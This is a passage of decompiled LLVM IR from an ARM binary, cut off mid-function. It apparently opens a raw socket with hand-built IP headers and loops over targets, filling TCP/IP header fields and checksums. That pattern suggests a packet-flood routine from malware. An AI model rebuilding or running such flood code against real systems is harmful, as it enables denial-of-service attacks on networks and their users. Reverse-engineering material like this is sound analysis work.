  store i32 %v0_9a88, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9a84, i32* %fp.global-to-local, align 4
  %v0_9a98 = load i32, i32* @r4, align 4
  %v4_9a9c = inttoptr i32 %v0_9a88 to i32*
  %v5_9a9c = call i32 @function_8570(i32 %v0_9a98, i32* %v4_9a9c, i32 4, i32 64)
  %v1_9aa4 = urem i32 %v5_9a9c, 256
  store i32 %v1_9aa4, i32* %ip.global-to-local, align 4
  %v0_9aa8 = load i32, i32* @r5, align 4
  store i32 %v0_9aa8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9ab4 = load i32, i32* @r4, align 4
  %v6_9abc = inttoptr i32 %v0_9aa8 to i32*
  %v7_9abc = call i32 @function_8570(i32 %v0_9ab4, i32* %v6_9abc, i32 5, i32 1)
  %v1_9ac8 = urem i32 %v7_9abc, 256
  store i32 %v1_9ac8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9ad4 = load i32, i32* @r5, align 4
  store i32 %v0_9ad4, i32* %r1.global-to-local, align 4
  %v0_9ad8 = load i32, i32* @r4, align 4
  %v5_9ae0 = inttoptr i32 %v0_9ad4 to i32*
  %v6_9ae0 = call i32 @function_8570(i32 %v0_9ad8, i32* %v5_9ae0, i32 6, i32 65535)
  %v0_9ae8 = load i32, i32* @r5, align 4
  store i32 %v0_9ae8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_9ae0, i32* @r8, align 4
  %v0_9af8 = load i32, i32* @r4, align 4
  %v4_9afc = inttoptr i32 %v0_9ae8 to i32*
  %v5_9afc = call i32 @function_8570(i32 %v0_9af8, i32* %v4_9afc, i32 7, i32 65535)
  %v0_9b00 = load i32, i32* @r5, align 4
  store i32 %v0_9b00, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_9afc, i32* @r7, align 4
  %v0_9b10 = load i32, i32* @r4, align 4
  %v4_9b14 = inttoptr i32 %v0_9b00 to i32*
  %v5_9b14 = call i32 @function_8570(i32 %v0_9b10, i32* %v4_9b14, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9b24 = load i32, i32* @r5, align 4
  store i32 %v0_9b24, i32* %r1.global-to-local, align 4
  %v0_9b28 = load i32, i32* @r4, align 4
  %v4_9b2c = inttoptr i32 %v0_9b24 to i32*
  %v5_9b2c = call i32 @function_8570(i32 %v0_9b28, i32* %v4_9b2c, i32 1, i32 1)
  %v1_9b34 = urem i32 %v5_9b2c, 256
  store i32 %v1_9b34, i32* %ip.global-to-local, align 4
  %v0_9b38 = load i32, i32* @r5, align 4
  store i32 %v0_9b38, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9b44 = load i32, i32* @r4, align 4
  %v5_9b4c = inttoptr i32 %v0_9b38 to i32*
  %v6_9b4c = call i32 @function_8570(i32 %v0_9b44, i32* %v5_9b4c, i32 19, i32 0)
  %v0_9b54 = load i32, i32* @r5, align 4
  store i32 %v0_9b54, i32* %r1.global-to-local, align 4
  %v2_9b58 = load i32, i32* @global_var_20780.45, align 4
  store i32 %v2_9b58, i32* %r3.global-to-local, align 4
  store i32 %v6_9b4c, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9b64 = load i32, i32* @r4, align 4
  %v4_9b68 = inttoptr i32 %v0_9b54 to i32*
  %v5_9b68 = call i32 @function_8570(i32 %v0_9b64, i32* %v4_9b68, i32 25, i32 %v2_9b58)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9b7c = call i32 @function_113bc(i32 2, i32 3, i32 6)
  %v7_9b80 = icmp eq i32 %v3_9b7c, -1
  store i1 %v7_9b80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9b80, label %dec_label_pc_a020, label %dec_label_pc_9b8c

dec_label_pc_9b8c:                                ; preds = %dec_label_pc_9a2c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9b94 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9b94, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9ba8 = call i32 @function_11378(i32 %v3_9b7c, i32 0, i32 3, i32 %v6_9b94, i32 4)
  %v7_9bac = icmp eq i32 %v5_9ba8, -1
  store i1 %v7_9bac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bac, label %dec_label_pc_a018, label %dec_label_pc_9bb4

dec_label_pc_9bb4:                                ; preds = %dec_label_pc_9b8c
  %v0_9bb4 = load i32, i32* @r8, align 4
  %v0_9bb8 = load i32, i32* @r7, align 4
  %v0_9bbc = load i32, i32* %fp.global-to-local, align 4
  %v0_9bc0 = load i32, i32* @r6, align 4
  %v1_9bc0 = urem i32 %v0_9bc0, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9bc8 = urem i32 %v0_9bb4, 65536
  store i32 %v3_9bc8, i32* %r3.global-to-local, align 4
  %v3_9bcc = urem i32 %v0_9bb8, 65536
  store i32 %v3_9bcc, i32* %r4.global-to-local, align 4
  %v0_9bd0 = load i32, i32* @sl, align 4
  %v2_9bd0 = icmp eq i32 %v0_9bd0, 0
  store i1 %v2_9bd0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9be8 = urem i32 %v0_9bbc, 65536
  store i32 %v3_9be8, i32* @fp, align 4
  br i1 %v2_9bd0, label %dec_label_pc_a02c, label %dec_label_pc_9bf8

dec_label_pc_9bf8:                                ; preds = %dec_label_pc_9bb4
  %v3_9bb8 = mul i32 %v0_9bb8, 65536
  %v3_9bb4 = mul i32 %v0_9bb4, 65536
  %v0_9bbc.not = or i32 %v0_9bbc, -65536
  %v1_9bfc = xor i32 %v0_9bbc.not, 65535
  %v3_9c00 = mul i32 %v5_9b14, 65536
  %v1_9c04 = add i32 %v3_9c00, 3407872
  %tmp67 = udiv i32 %v1_9c04, 256
  %v3_9c18 = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_9bfc, 256
  %v3_9c1c = and i32 %tmp68, 65280
  store i32 %v3_9c1c, i32* %ip.global-to-local, align 4
  %v1_9c20 = add i32 %v3_9c00, 524288
  %v1_9c28 = add i32 %v3_9c00, 1835008
  %tmp69 = udiv i32 %v1_9bfc, 256
  %v4_9c2c = urem i32 %tmp69, 256
  %v5_9c2c = or i32 %v4_9c2c, %v3_9c1c
  %v4_9c34 = udiv i32 %v1_9c04, 16777216
  %v5_9c34 = or i32 %v3_9c18, %v4_9c34
  store i32 %v5_9c34, i32* @r8, align 4
  %v3_9c40 = udiv i32 %v1_9c28, 256
  %tmp70 = mul i32 %v0_9bbc, 256
  %v3_9c44 = and i32 %tmp70, 65280
  store i32 %v3_9bb4, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_9bbc, 256
  %v4_9c54 = urem i32 %tmp71, 256
  %v5_9c54 = or i32 %v4_9c54, %v3_9c44
  %tmp72 = mul i32 %v0_9bb4, 256
  %v3_9c58 = and i32 %tmp72, 65280
  %v1_9c5c = and i32 %v3_9c40, 65280
  store i32 %v1_9c5c, i32* @r6, align 4
  store i32 %v3_9bb8, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_9bb8, 256
  %v3_9c68 = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_9bb4, 256
  %v4_9c6c = urem i32 %tmp74, 256
  %v5_9c6c = or i32 %v4_9c6c, %v3_9c58
  store i32 %v5_9c6c, i32* @lr, align 4
  %v4_9c70 = udiv i32 %v1_9c28, 16777216
  %v5_9c70 = or i32 %v1_9c5c, %v4_9c70
  store i32 %v5_9c70, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_9bb8, 256
  %v4_9c74 = urem i32 %tmp75, 256
  %v5_9c74 = or i32 %v4_9c74, %v3_9c68
  %tmp76 = udiv i32 %v1_9c20, 256
  %v3_9c78 = and i32 %tmp76, 65280
  store i32 %v3_9c78, i32* @r5, align 4
  %v4_9c8c = udiv i32 %v1_9c20, 16777216
  %v5_9c8c = or i32 %v3_9c78, %v4_9c8c
  store i32 %v5_9c8c, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_9ce0 = sext i8 %v5_9a80 to i32
  %sext12 = mul nuw i32 %v5_9c54, 65536
  %v4_9cf813 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_9c70, 65536
  %v4_9d5c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9c2c, 65536
  %v4_9d60 = sdiv i32 %sext9, 65536
  %v1_9d68 = trunc i32 %v4_9d5c to i16
  %v2_9d90 = icmp eq i32 %v1_9bc0, 0
  %sext10 = mul nuw i32 %v5_9c6c, 65536
  %v4_9db0 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_9c74, 65536
  %v4_9db8 = sdiv i32 %sext11, 65536
  %v1_9cf0 = trunc i32 %v5_9a9c to i8
  br label %dec_label_pc_9c94

dec_label_pc_9c94:                                ; preds = %bb82, %dec_label_pc_9bf8
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_9ca0 = call i32 @function_11f24(i32 1510, i32 4)
  store i32 %v2_9a48, i32* %r2.global-to-local, align 4
  %v3_9ca8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9ca8, i32* %r3.global-to-local, align 4
  %v2_9cac = load i32, i32* @r4, align 4
  %v5_9cac = mul i32 %v2_9cac, 4
  %v6_9cac = add i32 %v5_9cac, %v2_9a48
  %v7_9cac = inttoptr i32 %v6_9cac to i32*
  store i32 %v2_9ca0, i32* %v7_9cac, align 4
  %v0_9cb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_9cb0 = load i32, i32* %r3.global-to-local, align 4
  %v4_9cb0 = mul i32 %v1_9cb0, 4
  %v5_9cb0 = add i32 %v4_9cb0, %v0_9cb0
  %v6_9cb0 = inttoptr i32 %v5_9cb0 to i32*
  %v7_9cb0 = load i32, i32* %v6_9cb0, align 4
  store i32 %v7_9cb0, i32* %r4.global-to-local, align 4
  %v1_9cb4 = inttoptr i32 %v7_9cb0 to i8*
  %v2_9cb4 = load i8, i8* %v1_9cb4, align 1
  %tmp = urem i8 %v2_9cb4, 16
  %v1_9cb8 = zext i8 %tmp to i32
  %v1_9cbc = or i32 %v1_9cb8, 64
  store i32 %v1_9cbc, i32* %r2.global-to-local, align 4
  %v1_9cc0 = trunc i32 %v1_9cbc to i8
  store i8 %v1_9cc0, i8* %v1_9cb4, align 1
  %v0_9cc4 = load i32, i32* %r3.global-to-local, align 4
  %v5_9cc8 = mul i32 %v0_9cc4, 24
  store i32 %v5_9cc8, i32* %r1.global-to-local, align 4
  %v0_9ccc = load i32, i32* %r4.global-to-local, align 4
  %v1_9ccc = inttoptr i32 %v0_9ccc to i8*
  %v2_9ccc = load i8, i8* %v1_9ccc, align 1
  %v1_9cd0 = and i8 %v2_9ccc, -16
  %v1_9cd4 = or i8 %v1_9cd0, 5
  store i32 %v1_9ac8, i32* %r5.global-to-local, align 4
  store i8 %v1_9cd4, i8* %v1_9ccc, align 1
  store i32 %v4_9ce0, i32* %r2.global-to-local, align 4
  %v2_9ce4 = load i32, i32* %r4.global-to-local, align 4
  %v3_9ce4 = add i32 %v2_9ce4, 1
  %v4_9ce4 = inttoptr i32 %v3_9ce4 to i8*
  store i8 %v5_9a80, i8* %v4_9ce4, align 1
  store i32 %v1_9aa4, i32* %r3.global-to-local, align 4
  %v0_9cec = load i32, i32* %r5.global-to-local, align 4
  %v2_9cec = icmp eq i32 %v0_9cec, 0
  store i1 %v2_9cec, i1* %cpsr_z.global-to-local, align 1
  %v2_9cf0 = load i32, i32* %r4.global-to-local, align 4
  %v3_9cf0 = add i32 %v2_9cf0, 8
  %v4_9cf0 = inttoptr i32 %v3_9cf0 to i8*
  store i8 %v1_9cf0, i8* %v4_9cf0, align 1
  %v0_9cf4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9cf4, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_9c94
  store i32 %v4_9cf813, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_9c94
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_9cf813, i32* %r5.global-to-local, align 4
  %v3_9cfc = load i32, i32* %r4.global-to-local, align 4
  %v4_9cfc = add i32 %v3_9cfc, 6
  %v5_9cfc = inttoptr i32 %v4_9cfc to i16*
  store i16 64, i16* %v5_9cfc, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_9d04 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d04 = add i32 %v2_9d04, 9
  %v4_9d04 = inttoptr i32 %v3_9d04 to i8*
  store i8 47, i8* %v4_9d04, align 1
  %v0_9d08 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d08 = add i32 %v0_9d08, 20
  store i32 %v1_9d08, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_9d10 = load i32, i32* %r5.global-to-local, align 4
  %v1_9d10 = trunc i32 %v0_9d10 to i16
  %v3_9d10 = add i32 %v0_9d08, 4
  %v4_9d10 = inttoptr i32 %v3_9d10 to i16*
  store i16 %v1_9d10, i16* %v4_9d10, align 2
  %v0_9d14 = load i32, i32* @r8, align 4
  %v1_9d14 = trunc i32 %v0_9d14 to i16
  %v2_9d14 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d14 = add i32 %v2_9d14, 2
  %v4_9d14 = inttoptr i32 %v3_9d14 to i16*
  store i16 %v1_9d14, i16* %v4_9d14, align 2
  %v0_9d18 = load i32, i32* %r3.global-to-local, align 4
  %v1_9d18 = trunc i32 %v0_9d18 to i16
  %v2_9d18 = load i32, i32* %r2.global-to-local, align 4
  %v3_9d18 = add i32 %v2_9d18, 2
  %v4_9d18 = inttoptr i32 %v3_9d18 to i16*
  store i16 %v1_9d18, i16* %v4_9d18, align 2
  store i32 %v5_9b68, i32* %r3.global-to-local, align 4
  %v0_9d20 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d20 = add i32 %v0_9d20, 24
  %v2_9d20 = inttoptr i32 %v1_9d20 to i8*
  %v3_9d20 = load i8, i8* %v2_9d20, align 1
  %v4_9d20 = zext i8 %v3_9d20 to i32
  store i32 %v4_9d20, i32* %r2.global-to-local, align 4
  %v2_9d24 = add i32 %v0_9d20, 12
  %v3_9d24 = inttoptr i32 %v2_9d24 to i32*
  store i32 %v5_9b68, i32* %v3_9d24, align 4
  %v0_9d28 = load i32, i32* %r2.global-to-local, align 4
  %v1_9d28 = and i32 %v0_9d28, -241
  %v1_9d2c = or i32 %v1_9d28, 64
  store i32 %v1_9d2c, i32* %r2.global-to-local, align 4
  %v0_9d30 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d30 = load i32, i32* @sb, align 4
  %v2_9d30 = add i32 %v1_9d30, %v0_9d30
  store i32 %v2_9d30, i32* %r1.global-to-local, align 4
  %v1_9d34 = add i32 %v2_9d30, 16
  %v2_9d34 = inttoptr i32 %v1_9d34 to i32*
  %v3_9d34 = load i32, i32* %v2_9d34, align 4
  store i32 %v3_9d34, i32* %r1.global-to-local, align 4
  %v1_9d38 = trunc i32 %v1_9d2c to i8
  %v2_9d38 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d38 = add i32 %v2_9d38, 24
  %v4_9d38 = inttoptr i32 %v3_9d38 to i8*
  store i8 %v1_9d38, i8* %v4_9d38, align 1
  %v0_9d3c = load i32, i32* %r4.global-to-local, align 4
  %v1_9d3c = add i32 %v0_9d3c, 24
  %v2_9d3c = inttoptr i32 %v1_9d3c to i8*
  %v3_9d3c = load i8, i8* %v2_9d3c, align 1
  %v1_9d40 = and i8 %v3_9d3c, -16
  %v1_9d44 = or i8 %v1_9d40, 5
  store i8 %v1_9d44, i8* %v2_9d3c, align 1
  %v0_9d4c = load i32, i32* %r1.global-to-local, align 4
  %v1_9d4c = load i32, i32* %r4.global-to-local, align 4
  %v2_9d4c = add i32 %v1_9d4c, 16
  %v3_9d4c = inttoptr i32 %v2_9d4c to i32*
  store i32 %v0_9d4c, i32* %v3_9d4c, align 4
  %v0_9d54 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d54 = add i32 %v0_9d54, 24
  store i32 %v1_9d54, i32* @r5, align 4
  %v3_9d58 = add i32 %v0_9d54, 25
  %v4_9d58 = inttoptr i32 %v3_9d58 to i8*
  store i8 %v5_9a80, i8* %v4_9d58, align 1
  store i32 %v4_9d5c, i32* %r2.global-to-local, align 4
  store i32 %v4_9d60, i32* %r3.global-to-local, align 4
  store i32 %v1_9aa4, i32* %r1.global-to-local, align 4
  %v2_9d68 = load i32, i32* @r5, align 4
  %v3_9d68 = add i32 %v2_9d68, 2
  %v4_9d68 = inttoptr i32 %v3_9d68 to i16*
  store i16 %v1_9d68, i16* %v4_9d68, align 2
  %v0_9d6c = load i32, i32* %r3.global-to-local, align 4
  %v1_9d6c = trunc i32 %v0_9d6c to i16
  %v2_9d6c = load i32, i32* @r5, align 4
  %v3_9d6c = add i32 %v2_9d6c, 4
  %v4_9d6c = inttoptr i32 %v3_9d6c to i16*
  store i16 %v1_9d6c, i16* %v4_9d6c, align 2
  %v0_9d70 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9d70, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_9d78 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d78 = trunc i32 %v0_9d78 to i8
  %v2_9d78 = load i32, i32* @r5, align 4
  %v3_9d78 = add i32 %v2_9d78, 8
  %v4_9d78 = inttoptr i32 %v3_9d78 to i8*
  store i8 %v1_9d78, i8* %v4_9d78, align 1
  %v0_9d7c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9d7c, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9d7c = load i32, i32* %r2.global-to-local, align 4
  %v2_9d7c = trunc i32 %v1_9d7c to i16
  %v3_9d7c = load i32, i32* @r5, align 4
  %v4_9d7c = add i32 %v3_9d7c, 6
  %v5_9d7c = inttoptr i32 %v4_9d7c to i16*
  store i16 %v2_9d7c, i16* %v5_9d7c, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_9d80 = load i32, i32* %r3.global-to-local, align 4
  %v1_9d80 = trunc i32 %v0_9d80 to i8
  %v2_9d80 = load i32, i32* @r5, align 4
  %v3_9d80 = add i32 %v2_9d80, 9
  %v4_9d80 = inttoptr i32 %v3_9d80 to i8*
  store i8 %v1_9d80, i8* %v4_9d80, align 1
  %v0_9d84 = call i32 @function_e094()
  store i32 %v1_9bc0, i32* %r1.global-to-local, align 4
  store i1 %v2_9d90, i1* %cpsr_z.global-to-local, align 1
  %v1_9d94 = sub i32 1023, %v0_9d84
  store i32 %v1_9d94, i32* %r3.global-to-local, align 4
  br i1 %v2_9d90, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_9d9c = load i32, i32* @r5, align 4
  %v3_9d9c = add i32 %v2_9d9c, 16
  %v4_9d9c = inttoptr i32 %v3_9d9c to i32*
  store i32 %v1_9d94, i32* %v4_9d9c, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_9d98 = load i32, i32* %r4.global-to-local, align 4
  %v2_9d98 = add i32 %v1_9d98, 16
  %v3_9d98 = inttoptr i32 %v2_9d98 to i32*
  %v4_9d98 = load i32, i32* %v3_9d98, align 4
  store i32 %v4_9d98, i32* %r3.global-to-local, align 4
  %v2_9da0 = load i32, i32* @r5, align 4
  %v3_9da0 = add i32 %v2_9da0, 16
  %v4_9da0 = inttoptr i32 %v3_9da0 to i32*
  store i32 %v4_9d98, i32* %v4_9da0, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_9da4 = load i32, i32* @r5, align 4
  %v2_9da4 = add i32 %v1_9da4, 12
  %v3_9da4 = inttoptr i32 %v2_9da4 to i32*
  store i32 %v0_9d84, i32* %v3_9da4, align 4
  %v3_9da8 = load i32, i32* %stack_var_-44, align 4
  %v0_9dac = load i32, i32* %r4.global-to-local, align 4
  %v1_9dac = add i32 %v0_9dac, 44
  store i32 %v1_9dac, i32* @r6, align 4
  store i32 %v4_9db0, i32* %r2.global-to-local, align 4
  %v1_9db4 = add i32 %v3_9da8, 1
  store i32 %v1_9db4, i32* @r4, align 4
  store i32 %v4_9db8, i32* %r3.global-to-local, align 4
  %v1_9dbc = load i32, i32* @sl, align 4
  %v9_9dbc = icmp eq i32 %v1_9db4, %v1_9dbc
  store i1 %v9_9dbc, i1* %cpsr_z.global-to-local, align 1
  %v0_9dc0 = load i32, i32* @r7, align 4
  %v1_9dc0 = trunc i32 %v0_9dc0 to i16
  %v3_9dc0 = add i32 %v0_9dac, 48
  %v4_9dc0 = inttoptr i32 %v3_9dc0 to i16*
  store i16 %v1_9dc0, i16* %v4_9dc0, align 2
  %v0_9dc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_9dc4 = trunc i32 %v0_9dc4 to i16
  %v2_9dc4 = load i32, i32* @r6, align 4
  %v3_9dc4 = inttoptr i32 %v2_9dc4 to i16*
  store i16 %v1_9dc4, i16* %v3_9dc4, align 2
  %v0_9dc8 = load i32, i32* %r3.global-to-local, align 4
  %v1_9dc8 = trunc i32 %v0_9dc8 to i16
  %v2_9dc8 = load i32, i32* @r6, align 4
  %v3_9dc8 = add i32 %v2_9dc8, 2
  %v4_9dc8 = inttoptr i32 %v3_9dc8 to i16*
  store i16 %v1_9dc8, i16* %v4_9dc8, align 2
  %v0_9dcc = load i32, i32* @r4, align 4
  store i32 %v0_9dcc, i32* %stack_var_-44, align 4
  %v5_9dd0 = icmp slt i32 %v1_9db4, %v1_9dbc
  br i1 %v5_9dd0, label %dec_label_pc_9c94, label %dec_label_pc_9dd4

dec_label_pc_9dd4:                                ; preds = %bb82
  store i32 %v5_9b14, i32* %r5.global-to-local, align 4
  %v1_9ddc = add i32 %v5_9b14, 8
  store i32 %v1_9ddc, i32* %r4.global-to-local, align 4
  %v0_9dec.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_9de8.preheader

dec_label_pc_9de8.preheader:                      ; preds = %dec_label_pc_9dd4, %dec_label_pc_a02c
  %v0_9dec.pre = phi i32 [ %v0_9dec.pre.pre, %dec_label_pc_9dd4 ], [ 0, %dec_label_pc_a02c ]
  %stack_var_-124.0.ph = phi i32 [ %v1_9ddc, %dec_label_pc_9dd4 ], [ %v1_a034, %dec_label_pc_a02c ]
  %storemerge = add i32 %v5_9b14, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_9fe0 = icmp eq i32 %v1_9bc0, 0
  %v2_9ffc = icmp eq i32 %v1_9b34, 0
  %v2_9e28 = icmp eq i32 %v5_9b68, -1
  %v7_9e28 = icmp eq i32 %v5_9b68, -1
  br label %dec_label_pc_9de8

dec_label_pc_9de8:                                ; preds = %dec_label_pc_9de8, %dec_label_pc_9e78, %dec_label_pc_9de8.preheader
  %v0_9dec = phi i32 [ %v0_9dec.pre, %dec_label_pc_9de8.preheader ], [ 0, %dec_label_pc_9de8 ], [ %v1_9f14, %dec_label_pc_9e78 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9dec = icmp eq i32 %v0_9dec, 0
  store i1 %v2_9dec, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9dec, label %dec_label_pc_9de8, label %dec_label_pc_9df8

dec_label_pc_9df8:                                ; preds = %dec_label_pc_9de8
  br label %dec_label_pc_9dfc

dec_label_pc_9dfc:                                ; preds = %dec_label_pc_9e78, %dec_label_pc_9df8
  %v1_9e10 = phi i32 [ %v1_9f10, %dec_label_pc_9e78 ], [ 0, %dec_label_pc_9df8 ]
  %v5_9e00 = mul i32 %v1_9e10, 24
  %v1_9e04 = load i32, i32* @sb, align 4
  %v2_9e04 = add i32 %v1_9e04, %v5_9e00
  store i32 %v2_9e04, i32* %r3.global-to-local, align 4
  store i32 %v2_9a48, i32* %r4.global-to-local, align 4
  %v1_9e0c = add i32 %v2_9e04, 20
  %v2_9e0c = inttoptr i32 %v1_9e0c to i8*
  %v3_9e0c = load i8, i8* %v2_9e0c, align 1
  %v4_9e0c = zext i8 %v3_9e0c to i32
  store i32 %v4_9e0c, i32* %r2.global-to-local, align 4
  %v4_9e10 = mul i32 %v1_9e10, 4
  %v5_9e10 = add i32 %v4_9e10, %v2_9a48
  %v6_9e10 = inttoptr i32 %v5_9e10 to i32*
  %v7_9e10 = load i32, i32* %v6_9e10, align 4
  store i32 %v7_9e10, i32* @r5, align 4
  %v7_9e14 = icmp eq i8 %v3_9e0c, 31
  store i1 %v7_9e14, i1* %cpsr_z.global-to-local, align 1
  %v1_9e18 = add i32 %v7_9e10, 24
  store i32 %v1_9e18, i32* @r6, align 4
  %v1_9e1c = add i32 %v7_9e10, 44
  store i32 %v1_9e1c, i32* @r7, align 4
  %tmp86 = icmp ult i8 %v3_9e0c, 32
  br i1 %tmp86, label %dec_label_pc_9f24, label %dec_label_pc_9e24

dec_label_pc_9e24:                                ; preds = %dec_label_pc_9dfc
  store i32 %v5_9b68, i32* %r1.global-to-local, align 4
  store i1 %v7_9e28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9e28, label %dec_label_pc_9f84, label %dec_label_pc_9e30

dec_label_pc_9e30:                                ; preds = %dec_label_pc_9f24, %dec_label_pc_9e24
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9e38 = load i32, i32* @fp, align 4
  %v9_9e38 = icmp eq i32 %v0_9e38, 65535
  store i1 %v9_9e38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e38, label %dec_label_pc_9f9c, label %dec_label_pc_9e40

dec_label_pc_9e40:                                ; preds = %dec_label_pc_9f84.dec_label_pc_9e40_crit_edge, %dec_label_pc_9e30
  %v1_9e44 = phi i32 [ %v1_9e44.pre, %dec_label_pc_9f84.dec_label_pc_9e40_crit_edge ], [ 65535, %dec_label_pc_9e30 ]
  store i32 %v3_9bc8, i32* %r2.global-to-local, align 4
  %v9_9e44 = icmp eq i32 %v3_9bc8, %v1_9e44
  store i1 %v9_9e44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e44, label %dec_label_pc_9fc4, label %dec_label_pc_9e4c

dec_label_pc_9e4c:                                ; preds = %dec_label_pc_9f9c.dec_label_pc_9e4c_crit_edge, %dec_label_pc_9e40
  %v1_9e50 = phi i32 [ %v1_9e50.pre, %dec_label_pc_9f9c.dec_label_pc_9e4c_crit_edge ], [ %v1_9e44, %dec_label_pc_9e40 ]
  store i32 %v3_9bcc, i32* %r3.global-to-local, align 4
  %v9_9e50 = icmp eq i32 %v3_9bcc, %v1_9e50
  store i1 %v9_9e50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e50, label %dec_label_pc_9fd8, label %dec_label_pc_9e58

dec_label_pc_9e58:                                ; preds = %dec_label_pc_9fc4, %dec_label_pc_9e4c
  store i32 %v1_9bc0, i32* @r4, align 4
  store i1 %v2_9fe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9fe0, label %dec_label_pc_9ff4, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_9e58
  %v1_9e60 = load i32, i32* @r5, align 4
  %v2_9e60 = add i32 %v1_9e60, 16
  %v3_9e60 = inttoptr i32 %v2_9e60 to i32*
  %v4_9e60 = load i32, i32* %v3_9e60, align 4
  store i32 %v4_9e60, i32* %r3.global-to-local, align 4
  %v2_9e64 = load i32, i32* @r6, align 4
  %v3_9e64 = add i32 %v2_9e64, 16
  %v4_9e64 = inttoptr i32 %v3_9e64 to i32*
  store i32 %v4_9e60, i32* %v4_9e64, align 4
  br label %dec_label_pc_9e6c

dec_label_pc_9e6c:                                ; preds = %bb85, %.thread16
  store i32 %v1_9b34, i32* %r1.global-to-local, align 4
  store i1 %v2_9ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9ffc, label %dec_label_pc_9e78, label %dec_label_pc_a008

dec_label_pc_9e78:                                ; preds = %dec_label_pc_9e6c, %dec_label_pc_9ff4, %dec_label_pc_a008
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9e7c = load i32, i32* @r5, align 4
  %v3_9e7c = add i32 %v2_9e7c, 10
  %v4_9e7c = inttoptr i32 %v3_9e7c to i16*
  store i16 0, i16* %v4_9e7c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9e84 = load i32, i32* @r5, align 4
  store i32 %v0_9e84, i32* @r0, align 4
  %v2_9e88 = call i32 @function_c848(i32 %v0_9e84, i32 20)
  %v3_9e88 = trunc i32 %v2_9e88 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9e90 = load i32, i32* @r5, align 4
  %v4_9e90 = add i32 %v3_9e90, 10
